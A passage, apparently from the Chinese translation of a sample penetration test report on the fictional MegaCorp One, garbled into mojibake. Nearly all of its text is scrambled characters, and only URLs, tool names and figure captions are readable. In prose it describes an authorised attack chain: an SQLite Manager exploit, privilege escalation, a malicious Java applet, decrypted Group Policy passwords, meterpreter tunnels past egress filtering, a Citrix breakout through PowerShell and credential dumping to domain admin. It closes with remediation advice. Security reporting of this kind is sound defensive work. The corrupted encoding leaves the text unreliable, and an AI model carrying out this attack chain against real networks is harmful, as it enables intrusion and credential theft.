·å­˜åœ¨ç›¸åŒçš„åº•å±‚é—®é¢˜ï¼Œä½†åœ¨æ²¡æœ‰ä¿®æ­£çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ¼æ´ä¸èƒ½å‘æŒ¥ä½œç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬æ·»åŠ äº†åŠŸèƒ½ï¼Œè®©å®ƒæ”¯æŒHTTPè®¤è¯ï¼Œé€‚åˆäºæ–°ç‰ˆæœ¬çš„SQLite Managerã€‚è¿™ä¸ªæ–°çš„æ¼æ´éšåä¼šå‘å¸ƒå‡ºå»ã€‚ åœ¨å›¾12ä¸­å¯ä»¥çœ‹åˆ°æ–¹æ¡ˆçš„å†…å®¹ã€‚ Figure 12-ç½‘ç»œæœåŠ¡å™¨çš„æ”»å‡»æ–¹æ¡ˆ ææƒå½“å¾—åˆ°äº†åº•å±‚ç³»ç»Ÿçš„äº¤äº’æƒåï¼Œæˆ‘ä»¬ç»§ç»­å¯»æ‰¾å¯ä»¥æå‡æƒé™çš„æ–¹æ³•ã€‚éšåï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥å¯ä»¥åˆ©ç”¨çš„ææƒçš„æ¼æ´ã€‚(http://www.exploit-db.com/exploits/18411/)è¯¦ç»†ä¿¡æ¯è¯·çœ‹é™„å½•Aã€‚ Figure 13-ä½¿ç”¨ä¸€ä¸ªææƒçš„æ¼æ´ï¼Œè¯¥ä¸»æœºæ²¡æœ‰æ‰“è¡¥ä¸ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ å› ä¸ºä¸Šä¼ äº†æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œæ‰€ä»¥è®©åˆ©ç”¨è¯¥æ¼æ´æœ‰ä¸€å®šçš„å¯è¡Œæ€§ã€‚å¦‚æœæ²¡æœ‰è¿™äº›å·¥å…·ï¼Œè¿˜æ˜¯ç”±å¯èƒ½æˆåŠŸææƒçš„ï¼Œå°½ç®¡è¿™ä¹ˆåšå·¥ä½œé‡ä¼šå¤§å¤§å¢åŠ ã€‚ æœåŠ¡å™¨æœ‰è®¸å¤šæ¼æ´ï¼Œå¯ä»¥ç»™æ”»å‡»è€…å¾ˆå¤šæœºä¼šï¼Œå¦‚æœä¸è¡¥æ•‘çš„è¯ã€‚æœ‰äº†ç®¡ç†å‘˜çš„æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥åšå¾ˆå¤šçš„äº‹ï¼Œæ—¢å¯ä»¥æ”»å‡»MegaCorp Oneè‡ªå·±ï¼Œä¹Ÿå¯ä»¥æ”»å‡»å®ƒçš„ç”¨æˆ·ã€‚å½“ç„¶ï¼Œå¾ˆå¤§çš„å¯èƒ½æ˜¯åŒæ—¶åšè¿™ä¸¤ä»¶äº‹æƒ…ã€‚ JAVAå®¢æˆ·æœºæ”»å‡»ç™»å½•ç®¡ç†å‘˜è´¦æˆ·ï¼Œåˆ†æè¯¥ç³»ç»Ÿã€‚æ‰¾åˆ°äº†ç½‘ç«™çš„ä¸€ä¸ªç§æœ‰éƒ¨åˆ†ï¼Œè¿™ä¸ªéƒ¨åˆ†ç»™ä¸€äº›ç‰¹æ®Šçš„å·¥ä½œç«™è¿è¡Œä¸€ä¸ªJavaå°ç¨‹åºã€‚è¿™ä¸ªæœ‰é—®é¢˜çš„ç½‘æ®µåæ¥è¢«å‘ç°æ˜¯MwgaCorp Oneçš„ç®¡ç†ç½‘æ®µã€‚ Figure 14-Htaccessè§„åˆ™æš´éœ²äº†è¯¥ç½‘ç»œçš„ä¸€ä¸ªå­ç½‘ é€šè¿‡æŸ¥çœ‹logæ–‡ä»¶å’ŒJavaå°ç¨‹åºçš„è¿è¡Œæ–¹å¼ï¼Œå‘ç°è¿™ä¸ªç¨‹åºç»™MegaCorp Oneå­ç½‘å†…éƒ¨ç”¨æˆ·æä¾›äº†ç®¡ç†å‘˜åŠŸèƒ½ã€‚è¿™å¯¹æ”»å‡»è€…æ¥è¯´éå¸¸æœ‰åˆ©ï¼Œå› ä¸ºå®ƒæä¾›äº†è¿›å…¥å†…ç½‘çš„å¯èƒ½æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªç¨‹åºï¼Œè¿›å…¥å†…ç½‘ä¼šå¾ˆå›°éš¾ã€‚ è·å¾—äº†MegaCorp Oneçš„è®¸å¯åï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¯è¢«å®¢æˆ·æœºä¸‹è½½çš„å°ç¨‹åºã€‚æ”»å‡»çš„åŸç†æ˜¯è®©å®¢æˆ·æœºä¿¡ä»»è¿™ä¸ªç¨‹åºï¼Œå…è®¸è¿è¡Œï¼Œå°±å¯ä»¥è¿æ¥åˆ°å…¶ä»–çš„å®¢æˆ·æœºã€‚è¿™æ˜¯æ™®é€šçš„ç¤¾ä¼šå·¥ç¨‹æ”»å‡»çš„è¡ç”Ÿå“ï¼Œæ‰€è°“ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»ï¼Œå°±æ˜¯è®©å—å®³è€…ä¸»åŠ¨å»è¿è¡Œä¸€ä¸ªæœ‰å®³çš„ç¨‹åºã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸ç”¨å»è¯¯å¯¼å—å®³è€…ï¼Œå› ä¸ºè¿™ä¸ªç¨‹åºæ—©å·²è¢«è®¤ä¸ºæ˜¯å¯ä¿¡çš„ã€‚ æ­£å¦‚æ‰€æ–™ï¼Œå¯ä»¥è¿æ¥ä¸Šå…¶ä»–å®¢æˆ·æœºã€‚ Figure 15-åˆ©ç”¨æ¶æ„çš„javaå°ç¨‹åºï¼Œå¯ä»¥æ“çºµä¸»æœº åœ¨é€‚å½“çš„åœ°æ–¹å®æ–½è¯¥æ–¹æ¡ˆï¼Œå¯ä»¥å¾—åˆ°ç®¡ç†å‘˜ç½‘ç»œçš„ç³»ç»Ÿæƒé™ï¼Œè§å›¾16ã€‚ Figure 16-Javaå°ç¨‹åºæˆåŠŸæ”»å‡» å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜Javaå°ç¨‹åºçš„æ”»å‡»åªèƒ½æä¾›ä¸€èˆ¬ç”¨æˆ·çš„æƒé™ã€‚ä¸ºäº†èƒ½åšæ›´å¤šçš„äº‹ï¼Œéœ€è¦é€æ­¥æå‡æƒé™ï¼Œæˆä¸ºåŸŸç®¡ç†å‘˜ã€‚é¦–å…ˆï¼Œè¦è·å¾—æœ¬åœ°ç®¡ç†æƒé™ã€‚è¦è¾¾æˆè¿™ä¸€ç›®çš„ï¼Œå…ˆæ£€æŸ¥ç³»ç»Ÿçœ‹çœ‹æœ‰ä»€ä¹ˆæ¼æ´ã€‚ å‘ç°ä¸€ä¸ªç»„ç­–ç•¥é¦–é€‰é¡¹æ–‡ä»¶ï¼Œå…¶å…è®¸ç”¨æˆ·è§£å¯†æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚(http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚ Figure 17-åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥è·å¾—åŸŸæ§åˆ¶å™¨çš„Groups.xmlæ–‡ä»¶ Figure 18-åœ¨Groups.xmlä¸­åŒ…å«åŠ å¯†çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç  Figure 19-ä½¿ç”¨Microsoftå‘å¸ƒçš„åŠ å¯†å¯†é’¥ï¼Œè¿™ä¸ªåŠ å¯†å¯†ç å¾ˆå®¹æ˜“è§£å¯† ä½¿ç”¨è¿™ä¸ªæ˜æ–‡å¯†ç ï¼Œå¾—åˆ°å®¢æˆ·æœºçš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚ æ·±åŒ…æ£€æµ‹è§„é¿å½“å°è¯•å»ºç«‹è¿›å…¥å—æŸç³»ç»Ÿçš„é™„åŠ å±‚æ—¶ï¼Œé‡åˆ°äº†è¿›æ”»æ€§å‡ºå£è¿‡æ»¤ã€‚è¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°ï¼Œå½“ä¸ºMicrosohtè¿œç¨‹æ¡Œé¢åè®®å»ºç«‹åŠ å¯†çš„å‡ºå£éš§é“ã€‚ Figure 20-åˆæ­¥å°è¯•å»ºç«‹RDPçš„å‡ºéš§é“è¢«å‡ºå£è¿‡æ»¤ç³»ç»Ÿé˜»æ­¢ å¦å¤–ï¼Œå½“å°è¯•è¿æ¥æ”»å‡»è€…çš„åœ¨80ç«¯å£ä¸Šçš„SSHæœåŠ¡å™¨æ—¶ï¼Œå‘ç°ç½‘ç»œåè®®å¼ºåˆ¶æ‰§è¡Œã€‚æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªéš§é“æ¥é¿å¼€è¿‡æ»¤ï¼Œè¿™ä¸ªéš§é“æœ‰ä¸ªè¿è¡Œçš„meterpreterä¼šè¯ï¼Œå…è®¸è·å–æ”»å‡»è€…åˆ†äº«çš„æ–‡ä»¶ã€‚ç”¨è¿™ä¸ªä¼šè¯åœ¨å—æŸä¸»æœºä¸Šç”¨æœ¬åœ°ç®¡ç†å‘˜æƒé™è¿è¡Œwindows SHELLã€‚åœ¨è¿™ä¸ªshellé‡Œï¼Œæ‰§è¡Œä¸€æ®µé¢å¤–çš„meterpreterå…³é”®ä»£ç ã€‚ Figure 21-é€šè¿‡æœ€åˆçš„meterpreterä¼šè¯å»ºç«‹ç«¯å£è½¬å‘ï¼Œ å¯ä»¥ç›´æ¥è®¿é—®å—æŸä¸»æœº Figure 22-ç”¨è¿™ä¸ªæ–°å»ºç«‹çš„è¿æ¥æ¥è·å¾—ä¸»æœºçš„shell Figure 23-åœ¨10.7.0.22ä¸Šç”¨æœ¬åœ°ç®¡ç†å‘˜æƒé™å»ºç«‹ä¸€ä¸ªmeterpreter shell æœ‰äº†è¿™ä¸ªmeterpreter shellï¼Œå°±å¯ä»¥åˆ©ç”¨HTTP-Tunnelï¼Œè¿™æ˜¯ä¸€ä¸ªå¼€æºç¨‹åºï¼Œï¼ˆhttp://http-tunnel.sourceforge.net/ï¼‰å»å°è£…HTTPè´Ÿè½½å†…çš„ä»»æ„æµé‡ã€‚æ¯”å¦‚å°è£…æ”»å‡»è€…å’Œä¸»æœºçš„è¿œç¨‹æ¡Œé¢è¿æ¥æ•°æ®ã€‚è¿™ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„è®¿é—®æ–¹å¼ï¼Œè€Œä¸ä»…ä»…æ˜¯å‘½ä»¤è¡Œã€‚è¿œç¨‹æ¡Œé¢è¿æ¥æ˜¯ç”¨â€œmikeâ€œè¿™ä¸ªç”¨æˆ·çš„å¯†ç åˆ›å»ºçš„ï¼Œâ€mikeâ€œçš„å¯†ç å°±æ˜¯ä¹‹å‰ä»SQLite Managerå‘ç°çš„ã€‚è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚ Figure 24-é€šè¿‡httpéš§é“å±è”½è¿‡æ»¤åè®®ï¼Œå»ºç«‹è¿œç¨‹æ¡Œé¢è¿æ¥ æ­¤æ—¶ï¼ŒMefaCorp Oneçš„ç½‘ç»œå·²è¢«å®Œå…¨æ”»é™·ï¼Œå¦‚å›¾25æ‰€ç¤ºã€‚æˆ‘ä»¬èƒ½å¤Ÿä»¥æ§åˆ¶å°çš„æƒé™è®¿é—®ä¸€å°Megacorp Oneä¿¡ä»»çš„ç”µè„‘ã€‚åªæ˜¯è®¿é—®å—é™ï¼Œå› ä¸ºæ˜¯é ä¸€ä¸ªæ— ç‰¹æƒçš„åŸŸç”¨æˆ·ï¼Œå’Œä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ã€‚ Figure 25-åˆ°è¾¾ç®¡ç†å‘˜å­ç½‘ Citrixç¯å¢ƒä¸‹çš„æ¼æ´æˆ‘ä»¬ç”¨è¿œç¨‹æ¡Œé¢è®¿é—®æ–¹å¼è¿›å…¥å†…éƒ¨ç½‘ç»œï¼Œç»§ç»­æ‰«æä»¥å‘ç°æœ‰ä»·å€¼çš„ç›®æ ‡ã€‚æ‰¾åˆ°äº†ä¸€ä¸ªCitrixçš„æœåŠ¡å™¨ï¼Œåœ¨å—æŸä¸»æœºä¸Šå®ƒè¢«è®¾ç½®æˆä¸»é¡µã€‚ä½¿ç”¨å’Œå»ºç«‹è¿œç¨‹æ¡Œé¢è¿æ¥ç›¸åŒçš„è¯ä¹¦ï¼ŒæˆåŠŸç™»å½•Citrixã€‚ Figure 26-å‘ç°ä¸€å°æ”¯æŒieçš„CitrixæœåŠ¡å™¨ æ­¤Citrixç¯å¢ƒè¯´æ˜â€œieâ€œæ˜¯å”¯ä¸€å¯ä½¿ç”¨çš„ç¨‹åºã€‚è¿™ç§åšæ³•è¢«å¾ˆå¤šç»„ç»‡é‡‡ç”¨æ¥é™åˆ¶è¿›å…¥CitrixæœåŠ¡å™¨åº•å±‚çš„æ“ä½œç³»ç»Ÿã€‚ä½†æ˜¯æœ‰å¾ˆå¤šçš„æ–¹æ³•å¯ä»¥ç»•è¿‡é™åˆ¶ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ç”¨â€Saveâ€œè¿™ä¸ªå¯¹è¯æ¡†ç”Ÿæˆä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶ï¼Œå…¶èƒ½è®©æˆ‘ä»¬ä½¿ç”¨Powershellã€‚ è¿™æ ·åšå¯èƒ½æˆåŠŸï¼Œå› ä¸ºâ€œSaveâ€å¯¹è¯æ¡†çš„æ“ä½œæ–¹å¼å¤§è‡´ç›¸åŒï¼Œéƒ½æ˜¯â€œWindows Explorerâ€çš„æ–‡ä»¶ç®¡ç†çª—å£ã€‚ Figure 27-ä½¿ç”¨Saveå¯¹è¯æ¡†æœ‰å¯èƒ½çªç ´Citrixç¯å¢ƒä¸‹çš„é™åˆ¶ Figure 28-åœ¨Citrixä¸Šåˆ›å»ºæœ‰Powershellç¨‹åºçš„æ‰¹å¤„ç†æ–‡ä»¶ Figure 29-æ‰§è¡ŒPwershellçªç ´Citrixçš„é™åˆ¶ Powershellä¹Ÿå¯ä»¥ç”¨æ¥ä¸‹è½½æ¶æ„çš„ä»£ç ï¼Œè¿™äº›ä»£ç åˆ›å»ºåº•å±‚æœåŠ¡å™¨çš„meterpreterä¼šè¯ã€‚ Figure 30-Powershellå…è®¸ç»ˆç«¯ç”¨æˆ·æ¥å—ä»»æ„æºçš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬è¿œç¨‹ç½‘ç»œåœ°å€ åˆ©ç”¨Saveå¯¹è¯æ¡†è¿è¡Œä»»æ„å¯æ‰§è¡Œçš„ä»£ç ï¼Œå¯ä»¥å’Œä¹‹å‰çš„å‘ç°ç»“åˆåœ¨ä¸€èµ·ï¼Œä¹‹å‰å‘ç°äº†æœ¬åœ°è´¦æˆ·å¯†ç ï¼Œå¯ä»¥ä»¥ç®¡ç†å‘˜çš„æƒé™æ‰§è¡Œç¨‹åºã€‚è¿™å°±å–å¾—äº†è¿™ä¸ªç³»ç»Ÿçš„å®Œæ•´çš„ç®¡ç†å‘˜æ§åˆ¶æƒã€‚è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚ Figure 31-æ”»å‡»è€…åˆ©ç”¨ç®¡ç†å‘˜å¯†ç ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œæ¶æ„ä»£ç  Figure 32-å®ŒæˆCitrixæœåŠ¡å™¨çš„å®Œå…¨æ§åˆ¶ Figure 33-åœ¨ç®¡ç†å‘˜å†…ç½‘ä¸­æ·»åŠ äº†ä¸€å°ä¸»æœº å‡çº§ä¸ºåŸŸç®¡ç†å‘˜æœ‰äº†è¿™å°å—æŸCitrixæœåŠ¡å™¨ï¼Œæˆ‘ä»¬è¯•ç€åœ¨å†…å­˜ä¸­æœç´¢å¯†ç ã€‚CitrixæœåŠ¡å™¨æ˜¯è¿™ç§æ”»å‡»äº†çš„ç†æƒ³çš„å€™é€‰ï¼Œå› ä¸ºå¯ä»¥æ“ä½œå¾ˆé•¿æ—¶é—´ï¼Œè€Œä¸ç”¨é‡å¯è¿˜æœ‰ä¸ºå¤§é‡ç”¨æˆ·æä¾›æœåŠ¡ã€‚ æˆ‘ä»¬ç”¨Windows Credential Editorè¿™ä¸ªå·¥å…·æ¥å¾—åˆ°å†…å­˜ä¸­çš„å¯†ç ï¼Œå› ä¸ºå®ƒå¯ä»¥è¿è¡Œåœ¨64ä½çš„ç³»ç»Ÿä¸Šä¸”ä¸ä¼šäº§ç”Ÿé”™è¯¯ã€‚ Figure 34-ç”¨Windows Credentials Editorå¾—åˆ°æœåŠ¡å™¨ä¸Šçš„æ˜æ–‡å¯†ç  è¿™ä¸ªå·¥å…·çˆ†å‡ºäº†å¾ˆå¤šçš„å¯†ç ï¼ŒåŒ…æ‹¬WindowsåŸŸç®¡ç†å‘˜çš„å¯†ç ã€‚è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚ä¸ºäº†ä½¿æ¢å¤å‡ºæ¥çš„å‡­è¯æœ‰æ•ˆï¼Œæˆ‘ä»¬ç”¨åŸŸç®¡ç†å‘˜æƒé™åˆ›å»ºæ–°çš„è¿œç¨‹æ¡Œé¢è¿æ¥ä¼šè¯ã€‚ Figure 35-åŸŸç®¡ç†å‘˜è¯ä¹¦æœ‰æ•ˆæ­¤æ—¶ï¼Œå¯ä»¥æ§åˆ¶æ•´ä¸ªWindowsåŸŸäº†ã€‚ä¸€ä¸ªæ¶æ„æ”»å‡»è€…æœ‰è®¸å¤šçš„å·¥å…·å¯ä»¥ç”¨ï¼ŒåŒ…æ‹¬ï¼šï‚² åœ¨Windowsç³»ç»Ÿä¸Šåˆ©ç”¨ç»„ç­–ç•¥ä¸Šä¼ åé—¨ç¨‹åºã€‚ï‚² å¯¹ä»»ä½•ä½¿ç”¨Windowsèº«ä»½éªŒè¯çš„ç³»ç»Ÿä¸Šå­˜å‚¨çš„æ‰€æœ‰æ•°æ®è¿›è¡Œæ’é™¤ã€‚ï‚² é”€æ¯ä»»ä½•ä»¥åŠæ‰€æœ‰ç½‘ç»œèµ„æºã€‚ï‚² æœ‰ç›®çš„æ€§çš„æ”»å‡»MegaCorp Oneä»»ä¸€èŒå‘˜ï¼Œé€šè¿‡ä¿¡æ¯æ”¶é›†å·¥å…·ï¼Œä¾‹å¦‚å¯ä»¥è¾¨è®¤ä¸ªäººä¿¡æ¯çš„keystroke loggersï‚² æ³„éœ²å¯¹MegaCorp Oneä¿¡ä»»çš„ä¼™ä¼´æˆ–æ”¯æŒç»„ç»‡çš„ç³»ç»Ÿè¿›å…¥æ–¹å¼ï¼Œä¾¿å¯ä»¥å±•å¼€æ”»å‡» å¯ä»¥ç¡®å®šï¼Œè¿™äº›æ­¥éª¤æ˜¯å¯è¡Œçš„ï¼Œä¸”å¯ä»¥åœ¨å½“å‰ç¯å¢ƒä¹‹å¤–ä½¿ç”¨ã€‚å¾ˆæ˜æ˜¾ï¼Œå·²ç»æ”»é™·äº†æ•´ä¸ªMegaCorp OneåŸŸï¼Œæœ¬åœ°æ‰€æœ‰ç³»ç»Ÿå·²ç»å¤±å»äº†ä¸€ä½“æ€§ã€‚ Figure 36-æ”»é™·åŸŸ æ€»è®ºMegaCorp Oneæœ‰ä¸€ç³»åˆ—çš„é…ç½®é”™è¯¯ï¼Œè€Œä½¿å…³é”®å…¬å¸èµ„äº§æ³„éœ²ã€‚å¦‚æœä¸€ä¸ªæ¶æ„çš„ç»„ç»‡åˆ©ç”¨è¿™äº›é”™è¯¯ï¼Œä¼šäº§ç”Ÿæ¶åŠ£çš„å½±å“ã€‚ç°æœ‰çš„å…³äºå¯†ç é‡ç”¨ï¼Œä¸Šä¼ æ§åˆ¶çš„ç­–ç•¥è¿˜ä¸å®Œå–„ï¼Œä¸èƒ½æ¶ˆé™¤æ¼æ´å‘ç°äº§ç”Ÿçš„å½±å“ã€‚ è¿™æ¬¡æ¸—é€æµ‹è¯•çš„å…·ä½“ç›®æ ‡å¦‚ä¸‹ï¼šï‚² ç¡®è®¤è¿œç¨‹æ”»å‡»è€…èƒ½å¦æ”»ç ´MegaCorp Oneçš„é˜²å¾¡ç³»ç»Ÿï‚² ç¡®å®šå®‰å…¨æ¼æ´çš„å½±å“ï¼šï® ç»„ç»‡ä¿¡æ¯çš„æœºå¯†æ€§ï® MegaCorp Oneä¿¡æ¯ç³»ç»Ÿçš„å†…éƒ¨åŸºç¡€ç»“æ„å’Œå¯ç”¨æ€§ è¿™æ¬¡æ¸—é€æµ‹è¯•å®Œæˆäº†è¿™äº›ç›®æ ‡ã€‚ä¸€æ¬¡æ”»å‡»å°±å¯ä»¥è·å¾—æ‰€æœ‰çš„è”åˆèµ„äº§ã€‚è®¸å¤šè¢«è®¤ä¸ºæ˜¯å°äº‹çš„é—®é¢˜ä¼šè¢«ä¸€èµ·åˆ©ç”¨ï¼Œé€ æˆäº†ç³»ç»Ÿçš„æ²¦é™·ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ•´ä¸ªMegacorp Oneå®‰å…¨åŸºç¡€è®¾æ–½çš„å´©æºƒå¾ˆå¤§ç¨‹åº¦ä¸Šå½’å› äºå¯¹ç½‘ç»œè¾¹ç•Œå’Œä¸»æœºçº§åˆ«çš„è®¿é—®æ§åˆ¶ä¸è¶³ã€‚éœ€è¦å¼•è¿›æœ‰æ•ˆçš„ç½‘ç»œåˆ†å±‚ç³»ç»Ÿä»¥å‡è½»å› æ•´ä¸ªMegacorp OneåŸºç¡€è®¾æ–½çš„çº§è”å®‰å…¨æ•…éšœæ‰€äº§ç”Ÿçš„å½±å“ã€‚ å»ºè®®å› ä¸ºè¿™æ¬¡æ¸—é€æš´éœ²äº†æ•´ä¸ªç³»ç»Ÿæ¶æ„ï¼Œæ‰€ä»¥åˆé€‚çš„èµ„æºåˆ†é…å¯ä»¥ç¡®ä¿ä¿®è¡¥å·¥ä½œå¯åœ¨çŸ­æ—¶é—´å†…å®Œæˆã€‚è™½ç„¶éœ€è¦ä¿®å¤çš„æ¼æ´çš„å®Œæ•´è¡¨å•ä¸ä¼šæä¾›ï¼Œä½†ä¸€äº›é«˜å±æ¼æ´éœ€è¦è¯´æ˜ã€‚ å®‰å…¨å»ºè®®å¦‚ä¸‹ï¼š ç¡®ä¿ç»„ç»‡çš„ä»»ä½•åœ°æ–¹éƒ½ä½¿ç”¨äº†å¼ºå‡­è¯ã€‚åœ¨ç³»ç»Ÿçš„ä¸åŒå®‰å…¨å±‚çº§ä¸Šä½¿ç”¨å¼±å¯†ç å’Œç›¸åŒçš„å¯†ç ï¼Œä¼šä½¿æ”»å‡»æ›´åŠ å®¹æ˜“ã€‚å¯ä»¥å‚è€ƒNIST SP 800-11ï¼ˆhttp://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdfï¼‰æ¥åˆ¶å®šä¼ä¸šçš„å¯†ç æ¡æ¬¾ã€‚è™½ç„¶è¿™ä¸ªé—®é¢˜å­˜åœ¨ä¸å¹¿ï¼Œä½†ä»ç„¶æ˜¯ä¸ªé—®é¢˜ï¼Œéœ€è¦è§£å†³ã€‚ å»ºç«‹ä¿¡ä»»å¸¦ã€‚åœ¨å†…ç½‘ä¸­åˆé€‚çš„åœ°æ–¹å»ºç«‹ä¿¡ä»»é€»è¾‘è¾¹ç•Œã€‚æ¯ä¸ªé€»è¾‘ä¿¡ä»»éƒ¨åˆ†åº”ç›¸äº’è”åˆï¼Œä¸èƒ½è½»æ˜“ç ´åè€Œè¿ä¸Šå…¶ä»–éƒ¨åˆ†ã€‚æ‰€ä»¥è¦ä½¿ç”¨ä¸åŒçš„ç®¡ç†å‘˜è´¦å·ï¼Œè¿™æ ·æŸä¸€éƒ¨åˆ†å—æŸäº†ï¼Œä½†ä¸ä¼šå½±å“åˆ°å…¶ä»–éƒ¨åˆ†ã€‚ åœ¨æ‰€æœ‰ç³»ç»Ÿä¸­å®è¡Œå˜æ›´æ§åˆ¶ï¼šåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­éƒ½å‘ç°äº†é…ç½®é”™è¯¯å’Œä¸Šä¼ æ¼æ´ã€‚é€šè¿‡å˜æ›´æ§åˆ¶å¯å‡è½»è¿™äº›æ¼æ´å¸¦æ¥çš„é£é™©ã€‚ å®æ–½è¡¥ä¸ç®¡ç†ç¨‹åºï¼šæŒ‰ç…§NIST SP 800-40ï¼ˆhttp://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdfï¼‰æ¥åˆ›å»ºä¸€ä¸ªè¡¥ä¸ç®¡ç†ç¨‹åºï¼Œè¿™å¯¹å¯æŒç»­çš„å®‰å…¨ç¯å¢ƒæ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦ç»„ä»¶ã€‚è¿™å°†æœ‰åŠ©äºé™åˆ¶ç”±äºæœªä¿®è¡¥è€Œå¯¼è‡´çš„æ”»å‡»ã€‚ æ–½è¡Œå¸¸è§„æ¼æ´è¯„ä¼°ã€‚ä½œä¸ºæœ‰æ•ˆç»„ç»‡é£é™©ç®¡ç†ç­–ç•¥çš„ä¸€éƒ¨åˆ†ï¼Œæ¼æ´è¯„ä¼°è¦åœ¨å¸¸è§„éƒ¨åˆ†æ‰§è¡Œã€‚è¿™æœ‰åŠ©äºç»„ç»‡ç¡®å®šå®‰å…¨æ§åˆ¶æ˜¯å¦æ­£ç¡®é…ç½®ï¼Œæ“ä½œæ˜¯å¦å¦‚é¢„æœŸèˆ¬æ‰§è¡Œï¼Œæ˜¯å¦ç”Ÿæˆäº†æƒ³è¦çš„ç»“æœã€‚å‚ç…§NIST SP 800-30ï¼ˆhttp://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201ï¼‰å»ºç«‹é«˜æ•ˆçš„é£é™©ç®¡ç†ç³»ç»Ÿã€‚é£é™©ç­‰çº§å¯¹MegaCorp Oneé£é™©è¯„å®šçš„ç»“æœä¸ºé«˜ã€‚å¤–éƒ¨æ”»å‡»è€…å¯ä»¥è·å¾—æ•´ä¸ªç³»ç»Ÿçš„æ§åˆ¶æƒã€‚æœ‰ç†ç”±ç›¸ä¿¡ä¸€ä¸ªæ¶æ„çš„ç»„ç»‡èƒ½å¤Ÿæ–½è¡Œæœ‰æ•ˆçš„ç›®æ ‡æ”»å‡»ã€‚ é™„å½•Aï¼šæ¼æ´ç»†èŠ‚åŠå‡è½»å±å®³é£é™©ç­‰çº§èŒƒå›´é‰´äºNIST SP 800-30ï¼Œæ¼æ´æŒ‰ç…§ç›¸ä¼¼æ€§åŠå½±å“æ’åˆ—ã€‚é»˜è®¤çš„æˆ–å¼±çš„å‡­è¯çº§åˆ«ï¼šé«˜æè¿°ï¼šä¸€ä¸ªå…¬å…±ç®¡ç†ç•Œé¢ä»…é ä¸€ä¸ªå¼±å¯†é’¥ä¿æŠ¤ã€‚å½±å“ï¼šä»…é æš´åŠ›ç ´è§£ï¼Œå°±å¯èƒ½çˆ†å‡ºSQLite ManageræœåŠ¡çš„ç®¡ç†å‘˜å¯†ç ã€‚å› ä¸ºç¼ºå°‘é¢å¤–çš„æˆæƒå‡­è¯ï¼Œè¿™ä¹Ÿå¯èƒ½çˆ†å‡ºæ‰€æœ‰ç”¨æˆ·å¯†ç å“ˆå¸Œå€¼ã€‚å¦‚æœå¯†ç ä¼šé‡ç”¨ï¼Œé‚£ä¹ˆçˆ†å‡ºæ˜æ–‡å¯†ç å¯ä»¥è¿›ä¸€æ­¥æ”»å‡»ç›®æ ‡ç³»ç»Ÿã€‚ä¿®å¤ï¼šç¡®ä¿æ‰€æœ‰çš„ç®¡ç†ç•Œé¢å—å¼ºå¯†ç æˆ–å£ä»¤ä¿æŠ¤ã€‚é¿å…ä½¿ç”¨æ™®é€šçš„æˆ–å’Œä¸šåŠ¡ç›¸å…³çš„å¯†ç ï¼Œå› ä¸ºå¯ä»¥å¾ˆå®¹æ˜“é€šè¿‡å­—å…¸ç”Ÿæˆã€‚ å¯†ç é‡ç”¨çº§åˆ«ï¼šé«˜æè¿°ï¼šâ€œmikeâ€œåœ¨SQLite Managerå’Œä¸ªäººè®¡ç®—æœºä¸Šç”¨äº†ç›¸åŒçš„å¯†ç ã€‚å½±å“ï¼šé‡å¤ç”¨ç›¸åŒçš„å¯†ç æ˜¯ä¸€ä¸ªéå¸¸å·®çš„ä¹ æƒ¯ï¼Œåº”è¯¥å°½é‡é¿å…ã€‚è¿™ä¸ªæ¼æ´çš„å½±å“å¾ˆæ¶åŠ£ï¼Œå› ä¸ºå¤–éƒ¨æ”»å‡»è€…ç›´æ¥è·å¾—äº†å†…ç½‘è®¡ç®—æœºçš„æœ‰æ•ˆå‡­è¯ã€‚è¿™å¯èƒ½æš´éœ²æ›´å¤šçš„å¯æ”»å‡»çš„ç•Œé¢ã€‚ä¿®å¤ï¼šå‡çº§å¯†ç ç®¡ç†ç­–ç•¥ï¼Œæ‰€æœ‰éš”ç¦»æœåŠ¡å¼ºåˆ¶ä½¿ç”¨å¤æ‚çš„ï¼Œä¸åŒçš„å¯†ç ã€‚å¯†ç ç®¡ç†ç³»ç»Ÿè¦ä½¿é›‡å‘˜æ–¹ä¾¿çš„ä½¿ç”¨ä¸åŒçš„å¯†ç è¿›å…¥ä¸åŒçš„ç³»ç»Ÿã€‚ å…±äº«æœ¬åœ°ç®¡ç†å‘˜å¯†ç 